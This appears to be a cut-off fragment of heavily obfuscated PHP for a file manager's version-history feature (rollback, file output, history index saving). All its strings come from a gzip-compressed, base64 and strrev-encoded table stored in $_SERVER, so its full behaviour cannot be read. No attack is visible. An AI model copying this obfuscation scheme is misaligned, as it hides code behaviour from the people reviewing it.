strlen($ä•Ğ¡ğœ)); $ùâÄ«‚‰ = IO::move($¼Ó°ü³·[$Î¥¹¿Š[1324]] . $Ÿ½é¢¼İ[$Î¥¹¿Š[32]], $²‘ÙÄŸœ, !1, $¤Œóèî¢); if ($ùâÄ«‚‰) { $¼Ó°ü³·[$Î¥¹¿Š[457]][$°½íè¥˜][$Î¥¹¿Š[32]] = $¤Œóèî¢; } } $¼Ó°ü³·[$Î¥¹¿Š[1325]] = IO::move($¼Ó°ü³·[$Î¥¹¿Š[1325]], $²‘ÙÄŸœ, !1, $ä ƒé . $ú¼Î¥È); self::saveData($¼Ó°ü³·[$Î¥¹¿Š[1325]], $¼Ó°ü³·[$Î¥¹¿Š[457]]); self::clearEmptyFolder($¼Ó°ü³·[$Î¥¹¿Š[1324]]); } public static function rollback($½œÊ¢–¶, $ğ°´å­Ï) { $çÂ¥¸üÇ =& $_SERVER[Ò°Ì”İ•]; $˜±©—Ë« = self::listData($½œÊ¢–¶); if (!$˜±©—Ë«) { return; } $™ß¼Œµƒ = IO::info($½œÊ¢–¶); foreach ($˜±©—Ë«[$çÂ¥¸üÇ[457]] as $å³¦Şß => $ƒÛíì—Š) { if ($ƒÛíì—Š[$çÂ¥¸üÇ[487]] == $ğ°´å­Ï) { self::add($½œÊ¢–¶); $‹óä…Û = $˜±©—Ë«[$çÂ¥¸üÇ[1324]] . $ƒÛíì—Š[$çÂ¥¸üÇ[32]]; $´ªÅ»Ö‘ = IO::copy($‹óä…Û, IO::pathFather($½œÊ¢–¶), REPEAT_REPLACE, $™ß¼Œµƒ[$çÂ¥¸üÇ[32]]); if ($´ªÅ»Ö‘) { self::remove($½œÊ¢–¶, $ğ°´å­Ï); } return $´ªÅ»Ö‘; } } return !1; } public static function setDetail($–×ğ™ø, $ä±İÒšã, $öª£óªÅ) { $¤ı”Ğî =& $_SERVER[Ò°Ì”İ•]; $Î¥Ê”ê = self::listData($–×ğ™ø); if (!$Î¥Ê”ê) { return; } foreach ($Î¥Ê”ê[$¤ı”Ğî[457]] as $Ä…êöñ => $ŠĞ •ÛÏ) { if ($ŠĞ •ÛÏ[$¤ı”Ğî[487]] == $ä±İÒšã) { $Î¥Ê”ê[$¤ı”Ğî[457]][$Ä…êöñ][$¤ı”Ğî[1323]] = $öª£óªÅ; self::saveData($Î¥Ê”ê[$¤ı”Ğî[1325]], $Î¥Ê”ê[$¤ı”Ğî[457]]); return !0; } } return !1; } public static function fileInfo($Ù´áÂæ“, $…äØ¬Èá) { $•¨¸ƒÂ“ =& $_SERVER[Ò°Ì”İ•]; $Â¾ìå— = self::listData($Ù´áÂæ“); if (!$Â¾ìå—) { show_json(LNG($•¨¸ƒÂ“[119]), !1); } $××ºé¤£ = $•¨¸ƒÂ“[12]; foreach ($Â¾ìå—[$•¨¸ƒÂ“[457]] as $¾ÎŞşË¨ => $¦–ğ¾óµ) { if ($¦–ğ¾óµ[$•¨¸ƒÂ“[487]] != $…äØ¬Èá) { continue; } $××ºé¤£ = $Â¾ìå—[$•¨¸ƒÂ“[1324]] . $¦–ğ¾óµ[$•¨¸ƒÂ“[32]]; break; } if (!$××ºé¤£) { show_json(LNG($•¨¸ƒÂ“[119]), !1); } return IO::info($××ºé¤£); } public static function fileOut($â£×ğ, $š˜¿Çô“, $ÚßÄÕçÁ = false) { $¶¶Š½“› =& $_SERVER[Ò°Ì”İ•]; $ã±Œ×ÑŒ = self::fileInfo($â£×ğ, $š˜¿Çô“); $—¢çĞ¨ =& $GLOBALS[$¶¶Š½“›[7]]; $ÚßÄÕçÁ = isset($—¢çĞ¨[$¶¶Š½“›[1275]]) && $—¢çĞ¨[$¶¶Š½“›[1275]] == 1; if (isset($—¢çĞ¨[$¶¶Š½“›[33]]) && $—¢çĞ¨[$¶¶Š½“›[33]] == $¶¶Š½“›[1326]) { return IO::fileOutImage($ã±Œ×ÑŒ[$¶¶Š½“›[98]], $—¢çĞ¨[$¶¶Š½“›[1327]]); } IO::fileOut($ã±Œ×ÑŒ[$¶¶Š½“›[98]], $ÚßÄÕçÁ, get_path_this($â£×ğ)); } public static function listData($ß™Æºñ , $ºé¸Æ¬„ = true) { $ê§Œİã =& $_SERVER[Ò°Ì”İ•]; if ($ºé¸Æ¬„ && !IO::exist($ß™Æºñ )) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($ß™Æºñ , 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $íÉ¥Ğ¨µ = self::pathHistory($ß™Æºñ ); $°êË¦çÁ = array($ê§Œİã[1325] => $íÉ¥Ğ¨µ . $ê§Œİã[1312], $ê§Œİã[1324] => rtrim(get_path_father($íÉ¥Ğ¨µ), $ê§Œİã[8]) . $ê§Œİã[8], $ê§Œİã[457] => array()); $ÑÓ•ıŠê = IO::getContent($°êË¦çÁ[$ê§Œİã[1325]]); if ($ÑÓ•ıŠê) { $ÓêòÕ = json_decode($ÑÓ•ıŠê, !0); if (is_array($ÓêòÕ)) { $°êË¦çÁ[$ê§Œİã[457]] = $ÓêòÕ; } } return $°êË¦çÁ; } private static function saveData($÷şÖˆ³æ, $¾‡ßş×) { $ñÚı…± =& $_SERVER[Ò°Ì”İ•]; self::log($ñÚı…±[1328] . $÷şÖˆ³æ . $ñÚı…±[85] . count($¾‡ßş×), $ñÚı…±[825]); if ($¾‡ßş×) { return IO::setContent($÷şÖˆ³æ, json_encode($¾‡ßş×)); } $®üÀ·ÛĞ = IO::pathFather($÷şÖˆ³æ); IO::remove($÷şÖˆ³æ); self::clearEmptyFolder($®üÀ·ÛĞ); return !0; } public static function clearEmptyFolder($üß§ßè¤) { $é’‰÷÷ =& $_SERVER[Ò°Ì”İ•]; if (trim($üß§ßè¤, $é’‰÷÷[8]) == trim(self::$_historyBase, $é’‰÷÷[8])) { return; } $ææÃÆÇ = IO::pathFather($üß§ßè¤); $í…º”ƒÔ = IO::has($üß§ßè¤, !0); if ($í…º”ƒÔ[$é’‰÷÷[252]] > 0 || $í…º”ƒÔ[$é’‰÷÷[253]] > 0) { return; } IO::remove($üß§ßè¤); self::clearEmptyFolder($ææÃÆÇ); } private static function getBasePath() { $îù’¿ùô =& $_SERVER[Ò°Ì”İ•]; $°¨¥ÁÓ = Model($îù’¿ùô[1329])->get($îù’¿ùô[1330]); if ($°¨¥ÁÓ) { if (!IO::exist($°¨¥ÁÓ)) { IO::mkdir($°¨¥ÁÓ); } if (get_path_this($°¨¥ÁÓ) == $îù’¿ùô[1315]) { $àºŠù¨ = $îù’¿ùô[1331] . rand_string(8); @rename($°¨¥ÁÓ, get_path_father($°¨¥ÁÓ) . $îù’¿ùô[8] . $àºŠù¨); $°¨¥ÁÓ = DATA_PATH . $àºŠù¨ . $îù’¿ùô[8]; file_put_contents(DATA_PATH . $îù’¿ùô[1262], $îù’¿ùô[12]); Model($îù’¿ùô[1329])->set($îù’¿ùô[1330], $°¨¥ÁÓ); } return $°¨¥ÁÓ; } $°¨¥ÁÓ = DATA_PATH . $îù’¿ùô[1331] . rand_string(8) . $îù’¿ùô[8]; $°¨¥ÁÓ = IO::mkdir($°¨¥ÁÓ); $°¨¥ÁÓ = rtrim($°¨¥ÁÓ, $îù’¿ùô[8]) . $îù’¿ùô[8]; file_put_contents($°¨¥ÁÓ . $îù’¿ùô[1262], $îù’¿ùô[12]); file_put_contents(DATA_PATH . $îù’¿ùô[1262], $îù’¿ùô[12]); Model($îù’¿ùô[1329])->set($îù’¿ùô[1330], $°¨¥ÁÓ); return $°¨¥ÁÓ; } } goto cá–ì¯ä«Ù; e†¥¤‘š¶Ô: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\xd2\xb0\xcc\x94\xdd\x95", base64_decode('mvudhp+E')); $_SERVER[Ò°Ì”İ•] = explode("\x7c\x4\x7c\x4\x7c\x4", gzinflate(substr("\x1f\x8b\x8\x0\x0\x0\x0\x0\x0\x13\xcd\x7d\x79\x7c\x5b\xc5\xb5\x30\x5b\x81\xb0\x95\x42\xa1\xb4\x14\xb8\x31\x4\xdb\x89\x16\x3b\x7b\x9c\x38\x41\x96\x65\x5b\x89\x2c\x39\x92\x9c\x5\xdb\xdc\x5c\x4b\xd7\x96".strrev('ä¯rÌå›ô´´£Ê¬\'b¡h¥·²Ò-(¥²$J VÂBÊ–ò½ÑWIb').base64_decode('0O/3vj8+QqLZ78yZM2fOnDlzzr7fb7z9qhdXHYL/vPu7hzc/8hcaRn8ORH9I6LTLDj+A/A==')."\x77\xfc\x65\xeb\xaa\xaa\x5a\xa6\x1f\x31\x29\x7c\xd4\x95\xf\x6c\xd5\x7e\xa2\xdd\xa3\x5d\x1e\x9\x3d\xfb\x5c\xf0\xe8\x17\xee\x99\x1f\x18\xdd\xf2\xec\xd0\xe8\x81\x7\xbc\xb0\x7e\xee\x83\x75\xa8\x30\xad\x5b\x47"."\177\224\234\141\51\372\140\332\264\114\232\220\60\162\75\351\136\32\116\347\350\257\227\376\264\107\103\5\75\153\130\72\215\172\350\217\312\373\205\376\230\53\62\151\226\257\206\43\161\65\326\336"."\326\26\210\306\241\120\235\234\237\65\222\20\312\153\5\55\13\337\317\353\5\23\365\106\156\116\315\33\171\75\147\113\21\11\111\315\322\272\65\23\132\152\154\120\33\3\155\241\310\122\65\276"."\264\55\0\45\272\325\25\105\275\60\104\143\44\30\263\264\202\25\117\147\165\136\142\240\300\373\325\20\150\16\206\225\170\324\27\216\371\374\361\140\44\114\223\375\221\326\326\140\274\64\75\32"."\11\205\32\174\376\5\245\71\155\121\137\163\253\117\101\375\313\350\152\72\327\143\124\51\313\150\316\62\245\232\6\232\322\172\46\111\203\71\215\165\307\32\312\103\50\316\103\150\232\162\305\114"."\206\106\302\74\224\324\173\264\142\6\240\325\50\107\362\205\164\126\143\203\136\240\17\361\124\32\320\212\226\221\316\45\150\44\60\150\25\64\221\216\372\232\100\23\255\347\240\251\130\40\24\360"."\xc7\x15\xdc\x41\xa5\x29\x1a\x69\x55\x60\x12\xb2\x9a\x69\xe9\x5\x65\x71\x4b\x20\x1a\x50\x70\xa7\xeb\x2b\xc9\x58\x2b\x15\xc0\x97\x30\x2\x85\xe2\xb\x85\x94\xb1\x5a\xb0\xf4\x6c\x9e\x35\x43\xeb\x94\x69\x2c\x12".strrev('s˜=aécÑ\'­RÀ1à)©¤HƒIâ'."\n".'èÀiFˆº’Òf‚µœfÈÂP€Š¥†•Dm')."\246\320\70\216\251\275\272\245\242\245\141\241\57\1\242\66\370\142\101\277\332\346\213\267\0\344\362\171\257\231\354\63\275\132\41\221\112\367\353\241\164\267\267\73\235\363\142\4\365\164\263\245"."\x74\x4\xfd\x99\xa\xe3\x48\xe9\x89\x3e\x55\xeb\x36\xa\x96\xe\x68\x50\xcc\x65\xd2\xb9\x3e\xb9\x27\x30\x9\xb\x43\x8\x62\x53\x60\x1d\xd9\x62\xc9\x9e\x8c\xa5\xf6\x6b\x99\x22\x5b\x4e\x50\xbd\x12\x7e\x2a\xc5"."\x38\x4c\x3e\x2a\xc3\x84\x71\xac\x48\xe7\xd2\x45\x58\x5c\xd0\xa0\x61\x70\x62\x0\x81\x22\x2b\xad\xb3\x14\x3d\x9\x81\x2c\xaa\x6f\x40\xbd\x6e\x48\xeb\x66\xa5\x96\xb3\x40\x1a\x1\xaf\x9f\x6\xeb\xe7\xd2\xdf\xd9"."\120\277\33\3\266\137\57\130\252\236\113\30\311\164\16\250\317\74\130\105\232\225\152\54\40\200\26\140\30\106\46\311\302\246\155\222\302\305\254\134\204\107\321\164\144\222\5\106\60\366\127\222".strrev('ÒĞø¦2ZÏÑˆ[¬µ,'."\0".'z(Ó\\ñµË‚	ön£>=G–"²àşœCF')."\x46\x13\x6a\x28\x52\xb4\xe4\xc4\x22\x29\xd6\x64\x14\xb2\x8d\x8\x93\xe4\xb4\x56\xb4\xd8\xd3\x22\xb1\x8f\x2d\xf2\xa4\x4\x2d\x6f\x55\xc7\xf9\xee\xaf\xba\x3a\xce\x42\xff\x54\x3\x1d\xef\x84\xfe\xa4\xf4\x4c\x46"."\325\7\165\240\2\331\344\64\223\1\302\153\142\324\105\51\64\32\214\250\51\315\114\265\46\247\251\244\26\164\67\227\324\7\75\371\124\236\106\5\175\352\144\330\103\126\51\6\133\330\260\2"."\xd2\x26\x93\x31\x12\x5a\x46\x1e\xa\xd\xa7\x2c\x2b\x1f\xd3\x73\xc9\x26\x8e\xf5\x49\x63\x20\x47\xa0\x94\xd7\xd9\x2\x69\x74\x29\x49\xa5\x55\x59\xaa\xb4\xd4\xa5\xeb\x4c\x56\x31\x9b\xe1\x21\x36\x3a\x9e\x66\xf2"."\x44\x6b\x90\x4d\x65\xb2\x7\x30\x95\x2d\xcc\xa\xf8\x60\xda\x24\xe4\x5a\xd0\x1a\xb4\xae\x33\xe9\x84\x66\xa5\x8d\x9c\xd7\x48\x58\xba\xe5\x36\xad\x82\xae\x41\x8b\xbe\x44\x42\x37\x4d\xb7\x1f\x91\x86\x82\x91\x71"."\373\62\31\143\300\35\51\244\173\323\271\72\145\42\55\343\247\164\303\215\251\171\35\220\235\212\331\12\106\32\374\231\211\365\105\253\307\75\223\55\123\136\272\240\345\314\36\275\340\16\300\252"."\250\123\120\147\71\111\147\305\32\323\146\336\60\323\270\173\165\212\146\131\132\42\205\311\241\150\276\176\77\345\323\230\330\350\245\145\121\43\272\273\255\240\365\146\265\72\45\137\354\106\0\200"."\305\10\151\11\134\102\56\14\0\250\123\262\332\240\133\353\145\55\5\6\363\351\202\156\262\121\53\315\255\161\300\250\36\167\53\136\104\151\75\351\216\241\375\6\32\233\122\63\125\101\270\242"."\xb0\x3c\x9a\xda\x12\x8f\xb7\xa9\xc1\x26\xc4\x50\x84\x3\x6a\xab\x2f\xee\x7\x92\x1b\xb0\xb4\x5e\xd6\x74\x8\xed\x22\xbc\x49\x96\xb8\xc4\x8d\x16\x13\xc6\xa6\x30\x1a\x9c\x48\x6c\x33\x6\xf4\x2\xfa\x70\xc3\x50"."\x9d\xd2\x67\x24\xbb\x8d\x41\xf\xcb\x6a\x2\xd2\xcf\xa\xe3\xf9\xcd\x5b\xee\xa8\x96\xeb\xc5\xc3\xe8\x1e\xb2\x74\xc0\x39\x41\x97\x1a\x10\xfb\xe1\xe9\xa1\x2b\xd7\xd3\xad\xf7\x18\x5\x18\x8d\xd9\xdf\x6b\x7\x7e"."\110\317\365\132\51\326\166\54\20\135\24\210\252\261\110\123\174\261\57\12\334\112\16\141\316\40\353\15\376\172\306\35\325\223\10\210\11\213\325\323\362\2\372\113\334\170\301\340\217\263\134\274".base64_decode('iFheKNiMYdfoNlEht1yKtR1KZ9N4eBbPIcBGrEwzdMhLxlzfaU6s6kxOqnajfydWd3Q2eg==').strrev('DÑ D5Ñnî¦"°»/NFsÃ,dJ5’è0(ËZU¼Ci]3\\™V§­oE¦óÍv&')."\xd8\xe6\xc5\xc5\xbe\x45\xe3\xfb\x81\x2e\xde\x35\x25\x5a\xe2\x98\x17\x9a\x18\xd\x2c\x6c\xf\xc4\xe2\x6a\x6b\x20\xde\x12\x69\x84\xee\x7\x7c\x10\xca\xa1\xca\xa4\xbf\x6c\x8e\x31\x2b\x49\x83\x8\xc6\x10\x60\x64"."\6\103\134\354\3\11\31\40\244\136\330\30\240\261\264\341\100\40\77\346\14\306\310\103\41\30\215\101\351\22\233\272\16\372\323\5\330\334\105\177\324\264\331\44\355\231\70\312\351\253\152\164"."\57\107\230\325\252\263\115\4\276\24\314\242\65\54\172\256\332\67\70\66\254\126\201\351\150\311\54\116\47\371\16\210\242\55\172\272\67\5\35\115\343\346\22\106\306\50\150\31\114\373\31\253".base64_decode('3ZsGMpzPFBHee3HD8VQx2w07FYIRYrwEF2wOIVYRKC86NCBgBmFaYM+FmFfFuNrpyed6qw==').base64_decode('z4C21MnTanACTCOMDB0Hinrp0D0JAy3sVq1Pr8NjAWo2m6SyiEQwZ+M9rt5JF/D0ZDxZ1A==').base64_decode('CGnTb/BdmR64gAFie5yiFwpGYTyUIGGFbJR4uqBxi7McJiIBLJwyOItiMGSs88K4J0xuAg==')."\xb2\x91\x44\xac\x9a\xc7\xb4\xd0\x24\xa0\x1\x6a\xc9\x64\xb9\x64\x44\x6a\xa0\x81\x55\xc\x4f\x49\x6\x8d\x4\x23\xde\xd8\x14\xf4\xbf\xd8\xf4\x93\x46\x56\x63\x5b\x28\xa6\x3c\xfc\xb3\x38\x62\xf2\x18\xd9\x17\xf5".base64_decode('JN0YbUl0RdOkieyTBcvAmQVbSYSkKQM6jbACBszWQp7DIKlndIZgKZ3xFjVQDM0MRz/BXQ==')."\243\363\16\112\25\14\135\332\214\242\232\230\23\140\361\305\370\200\50\22\60\73\4\170\45\202\31\64\253\21\262\240\104\274\255\240\367\244\201\240\347\20\141\150\325\12\175\154\140\250\246\130"."\x8a\x38\x22\x2d\xd3\xa6\xf6\x50\x48\xf5\x47\xc2\x71\x74\xbe\xa4\x29\x8b\xa3\xc1\x38\x90\xb1\x28\x22\x47\xaa\xcf\xdf\x6\x31\x41\xf4\x38\xc7\x26\xf3\x1c\x34\xa5\x7f\x32\xa0\x10\xea\x84\x57\x30\x47\x68\x77\xce".base64_decode('GzlEWoE6ucXpsyQrKXgHwB3BbzhYCMQEZIfdWURX3LxPbe1xWJ6AFYwHbhjC7C1Mfro3tw==')."\210\317\374\342\330\124\167\113\253\317\357\216\265\370\46\117\233\116\123\227\146\223\235\361\226\264\331\171\66\217\103\167\6\314\251\152\101\107\153\232\341\302\344\232\132\266\342\20\43\242\211\236"."\57\165\147\335\270\25\314\103\172\152\152\152\130\133\223\246\53\51\104\112\0\53\214\134\222\214\226\35\153\212\211\76\206\170\204\176\233\356\201\64\243\171\147\160\376\373\214\122\340\233\105\262"."\x9d\xa9\x5a\x2\x37\xa7\xa2\xca\x56\xd1\x94\x21\x85\x10\x30\x89\xaa\xa4\x19\x5b\x4c\x53\xb5\x4c\xaf\x81\xf0\x2e\x95\x95\x13\x93\x1c\x7f\x69\x5c\xa7\x3c\x16\x7c\x28\xa5\x71\x38\x61\xe8\xb1\xc5\x81\x38\xb8\x21"."\xb9\x12\x6\x33\xea\x3\xa3\xdf\x76\xa6\x5a\x89\x97\x7\x34\xe5\xd5\x83\x0\x6d\xd1\x8f\x3c\xde\xca\x10\xd5\x66\xd3\x76\x26\x7c\xbf\x88\x16\x6c\x21\x3d\x2c\x81\x7d\x1e\x6b\x82\x11\xcb\x48\xc\xbe\x35\x98\xcd".strrev('•õŸÎÂ¥MOZÊú¹6–?J‹èyœÚiæİ:6·ğ0'."\0".'œ-9Ê®$ì9EPi(ÀÀ“ˆ').strrev('-‚Ì0«V;Ç7.Wfíƒ\\@‡Í¤Xvæ~AÂçe x[BzcÍ‘¿Ä{›Ï‘Ä&ñí').base64_decode('UdtCvnhTJNoKyJ3PC3zKJ8otM7cgRUXTrWOOGNBfS2QcuCnDYklZFFxSDgWXOFBwSSkKLg==').base64_decode('KYdg/YCJWlYbNnJooaIdNutJAFrEW4LhBWprpDEQUoNhxLnFS9Pb2xp9jP7J6Q0RJoGB1A==')."\166\304\273\55\362\205\202\316\342\201\45\301\130\74\126\66\13\245\265\7\34\71\215\15\152\133\64\320\24\134\302\243\115\301\100\250\61\246\372\175\376\26\121\46\354\153\205\10\142\222\364\114"."\322\364\332\313\253\210\11\215\161\221\240\12\10\7\61\233\24\116\145\162\33\125\220\140\164\240\321\141\72\140\270\130\250\112\106\2\42\325\204\121\344\54\45\73\275\147\331\36\213\16\143\0"."\x76\x76\x12\xa9\xa2\x3f\xd5\x8a\x2f\xa6\x58\x79\x68\x3\xed\xa6\xdd\x43\x3c\x48\x86\xc1\xe2\x88\xfd\x80\xef\x2b\xc0\x10\x97\xf4\x40\xc5\x65\x1a\xa4\x63\x4f\xf9\x4\x5f\x8f\xc5\x59\x50\x47\x1c\xed\x1d\x22\xf"."\315\200\217\110\157\21\46\220\31\201\317\244\321\116\124\260\174\254\73\75\102\162\252\106\332\2\121\37\226\273\252\213\243\221\160\63\124\30\110\351\254\3\101\0\177\25\73\207\202\370\325\22"."\33\272\226\111\153\114\242\45\200\276\334\140\240\104\147\157\370\234\236\143\160\356\306\334\214\305\272\7\201\36\264\220\41\230\64\212\274\375\156\303\200\66\63\370\310\105\203\150\315\160\201\355".base64_decode('cpOhxSDbmyfBBweB2YpHFgTCKsMlGpPwjyYEotFIFEBgGX1M7EUzo4FYIM6+vaKYZgDyeg==').base64_decode('JgHe6oifg897z+kcmFTV4Z7k6UKB6oln0SjEOj22KGOziwVeG7OAVea86rpOb6e3al5dhw==')."\xcf\x3d\xac\xb9\x87\x6b\xdc\xb3\xdc\x5d\x88\x39\xaf\x9e\x4\x9\x5d\x2b\x27\xbb\xa6\xae\xc6\x5\x50\xc1\x79\xa7\x77\xa1\x9f\xfa\xce\x79\x13\x3a\xdd\x67\x9e\xbb\xec\xac\x8e\xce\xae\xca\xba\x49\xe3\x3b\x3d\xa7"."\167\16\164\115\254\236\307\276\223\50\26\20\377\317\66\65\324\325\344\244\52\324\45\164\102\345\105\162\22\51\46\5\130\306\160\72\57\122\127\116\137\315\322\321\34\352\275\242\106\207\273\163".base64_decode('Utc8qZ6U5PwWoqaI20vxcj732XhkvCpe6YAfxVxCbIh4JXRr/KjXmxNHKqvARaH9CDsFzQ==').base64_decode('XTmB/q5mE9mrwzInlzeMkyrm0ivY2Sanr4CAYXGM1q0BnaEHSrfFEXKwfQBlSbGMtG8QuQ==')."\25\307\121\216\114\351\274\212\217\171\3\74\206\266\25\230\247\161\120\332\114\150\171\75\46\215\120\125\343\276\206\120\100\145\64\5\150\57\213\23\72\330\300\257\171\320\320\4\15\145\24\101".strrev('1è±u5ùäòg ¡W?R›¬AVÁf‚’£ãÌY—Èê¯€¤!FEsu¬I’')."\115\202\76\345\305\14\231\350\10\302\16\1\336\252\316\316\142\207\236\354\352\100\210\257\271\173\272\126\116\131\135\315\4\47\336\116\364\37\213\370\312\334\275\250\232\305\100\302\51\241\332\34"."\x88\x7b\x70\x8f\xb8\xdc\xda\x16\xe1\xd9\x34\x6a\x14\xf8\x99\x22\x6f\x3b\xd4\x5b\x86\xa5\x65\x6c\x4d\xc4\x71\xa\x4c\x33\xe7\xc5\x40\x8a\x4b\xe7\x3d\x24\x68\x17\x66\x3a\xa4\xeb\x2b\x42\x4a\xc3\x5c\x6a\xca\x99"."\141\351\136\2\327\210\351\226\207\227\160\111\231\52\212\333\256\22\353\101\42\333\223\316\241\205\345\227\266\71\52\107\217\21\131\200\355\316\313\324\361\335\113\123\61\223\261\270\10\46\223\356".base64_decode('gy/AqoErODf9USaVq4qOI0wiORG6UTGxXMFgLmcku2WkExtssw+xMnGlil3DKMGw0hCJhA==').strrev('O‚4]ˆÈÁŒÔ·BéänÀ@ğl7îÖn‚°n'."\0".'x±›e†Ğù´£ƒØr÷‚°¾')."\145\56\54\240\160\141\276\302\205\172\355\302\62\15\227\70\363\272\304\175\206\253\77\255\17\220\0\77\217\272\340\230\352\22\322\30\10\6\33\135\151\263\221\34\267\311\7\110\26\353\202\225"."\302\242\346\214\66\344\242\335\11\351\375\172\306\305\344\64\56\326\107\27\223\116\271\210\124\251\21\272\325\216\26\26\164\213\4\21\375\114\271\60\2\141\374\165\211\33\26\227\61\220\323\13"."\244\10\0\106\234\324\135\342\24\357\352\55\30\305\174\33\373\246\24\243\335\202\4\321\147\236\20\65\14\313\305\4\136\56\131\362\5\275\360\261\165\122\26\234\345\107\103\340\357\354\4\340".base64_decode('F84qhdLXTFbpfNiFfitpiyDhXM32O1sZInzjnCcGuAgtEgsVD6BJg7s82qwc5giasyOquA==')."\120\21\327\150\202\317\165\312\137\234\27\154\370\243\350\60\25\223\76\147\151\275\354\133\230\130\361\243\126\231\242\64\34\325\23\103\11\41\320\151\224\304\104\366\130\275\175\74\56\262\200\312"."\x21\x7f\xf9\xc9\xe5\x8\xcd\xe7\xe2\x88\x71\xe3\x18\x70\x19\x96\xf3\x89\xb5\x2d\x8e\xaf\x5f\x96\x30\x20\x42\xfb\x22\x79\xc1\x47\xd0\xce\x62\xfa\x1b\x43\xfb\x5a\x53\x86\x41\x63\xb2\x9c\xd\x94\xd7\x65\x8f\xe1"."\125\345\41\224\230\334\260\307\270\10\61\24\150\212\53\363\43\210\154\245\15\225\326\121\161\141\205\374\143\344\24\133\333\14\134\112\75\311\27\161\55\227\244\51\313\20\211\137\126\137\301\76".base64_decode('UmGrLvDD3gkXi9q+JqZaBgLGAzJ8sS2xpIjYBYvA/GkmHLywABZCOksTUysjpERnRALrlw==')."\355\273\70\52\26\23\103\11\5\177\0\32\40\354\12\246\45\156\261\54\244\250\35\344\16\214\164\354\235\30\104\155\351\334\120\72\27\113\143\271\202\63\25\172\14\324\123\254\152\21\243\130"."\71\126\230\356\36\130\270\100\333\167\301\145\260\13\253\52\110\73\263\20\146\242\336\23\265\211\254\355\142\241\264\347\320\220\124\104\100\0\26\62\140\174\112\53\10\140\62\362\203\151\0\37"."\203\211\213\210\250\124\254\107\353\27\234\211\255\216\104\104\114\153\210\365\136\16\332\33\245\321\106\27\371\155\101\235\227\227\53\237\236\42\352\71\53\104\151\17\242\5\41\4\53\364\103\6".strrev('Ïeˆë§Ú'."\0".'ùÙ'."\0".'œ'."\0".'ä•B.«À0q'."\0".''."\0".'D"ğàÜ#lÅ÷†!HtÍşè~’X\\7').strrev('ÚZ§è¯SÖ+à&%ñ‡_}‹Î˜yÄ-.O$¬BÑy¡8ÑÓ8É¼”&Fo¤kÁà¬m ')."\xf\x8c\xc1\xe5\xe3\x4d\x5\x83\x73\xb5\x7c\x4b\x77\x16\xf2\x93\x3\xa4\xc5\xca\x39\xb6\x61\x9\x1e\x36\xd6\xa1\x24\x49\xaa\xe3\x64\x22\x1c\xa9\x8e\x28\x66\x2c\x1c\xcb\x5a\x52\x3a\x20\x97\x32\x5\xba\x63\x79"."\xd0\x71\x0\x34\x74\x5c\x35\x12\x7f\x25\xe8\xcb\x4a\x7a\x31\x6\x3b\xdc\x6a\xc7\xfc\x5a\x86\x81\xce\x98\x5\x4f\x1\x7d\x51\x74\x44\xa2\x6d\x40\x18\x88\xa6\x46\x4c\xeb\xd1\x65\xae\xc0\x96\xe9\xcb\xe7\x45\xb7"."\171\373\46\252\42\321\157\73\133\304\332\214\345\65\106\266\25\267\342\150\101\313\347\345\157\162\236\216\41\74\71\201\24\171\202\2\27\235\164\324\142\110\274\257\64\43\304\31\142\114\131\2"."\311\264\205\123\360\122\65\330\255\221\50\50\66\127\147\145\21\227\251\75\331\264\112\320\106\234\66\134\23\154\45\355\34\6\44\116\44\334\200\107\60\104\345\165\233\22\106\36\160\111\322\122"."\314\32\375\272\224\210\57\360\362\42\107\212\322\154\51\113\64\52\225\342\123\101\172\204\126\146\222\260\321\2\12\244\54\324\45\247\161\272\370\75\370\324\341\21\120\16\66\372\12\5\206\372"."\164\230\370\162\31\45\312\111\230\162\306\330\272\55\267\323\321\306\3\375\102\7\221\66\205\77\354\241\204\3\337\140\106\162\174\275\210\160\151\121\131\26\131\276\241\230\270\305\267\307\312\27"."\xf7\x65\x32\x42\xef\xca\x19\x1f\xb3\xa\x25\x18\x72\x25\x39\x65\xcc\x6a\x4d\xe4\x0\xcc\x54\x16\xca\xa5\xf1\xa3\xcf\xd8\xec\xbc\xf3\x26\xdd\x4e\xe4\xc7\xe6\x76\xd8\x22\x76\x9e\x52\xf8\x34\x96\x8f\xa3\x7d\xdd"."\x9f\x4a\xe7\x74\x26\xb0\xe9\x49\x17\xb8\x4e\xef\xff\x47\x6c\x75\x29\xe4\xf1\xa\x19\xb\x5d\x70\x9e\x24\xb5\xc6\xba\xd0\xfd\xba\x7c\xce\xe0\x82\x5a\x41\xaa\xf8\x86\xf\xcd\x9\x36\x6\x58\x9\x29\xa2\x5a\x36".base64_decode('bixK2peWkw1D0PKl8MCbXTDiMcfAWWc5rqRCaOIg36PlSjgLz6XcqOD+9lOeNy44Qbkcwg==')."\135\234\61\126\137\131\66\157\345\316\277\377\355\275\317\101\7\176\335\363\257\376\375\326\67\150\170\326\264\131\64\200\376\34\264\352\120\32\22\312\360\153\226\14\31\47\77\175\302\141\353\176"."\164\313\223\227\146\175\13\375\67\34\127\275\60\363\336\57\277\375\315\113\217\173\252\143\343\225\115\227\275\365\221\353\147\157\177\360\102\241\177\321\31\355\377\116\74\320\172\323\274\350\355\167".base64_decode('Hfly4LJXUuefmEocltpw67h/ZP/r9L9U3D/76Y82RisOv+H6GUbPm5+sfHrivz5bGznv4w==')."\xcf\x9a\xf\xbe\xe8\xcb\x3\x8a\xbb\x5e\x5d\x7b\x6a\xeb\xdf\x6e\xbb\x74\xdc\xee\xd9\x2f\x7c\x76\x48\xf2\xaf\x77\xff\xea\xf5\x43\x5f\x9a\xf5\x8d\x1d\xb9\xa7\x7\xbe\xf8\x73\xe0\xab\x27\xe6\x3f\xf7\x87\x13\xff"."\375\247\165\265\37\54\233\363\366\224\371\367\374\342\200\343\36\157\231\163\335\241\147\156\72\371\211\37\157\376\365\373\273\47\34\166\163\335\371\323\357\254\71\273\133\75\345\335\370\353\207\155"."\312\105\146\357\175\171\346\133\77\34\71\51\177\103\377\332\217\352\175\203\33\203\47\234\365\336\75\233\207\377\371\327\225\257\177\71\151\343\163\153\377\325\163\175\344\221\372\271\47\56\370\355"."\355\257\144\76\376\173\377\143\77\153\277\247\157\305\306\175\276\215\163\37\334\165\306\25\135\313\265\247\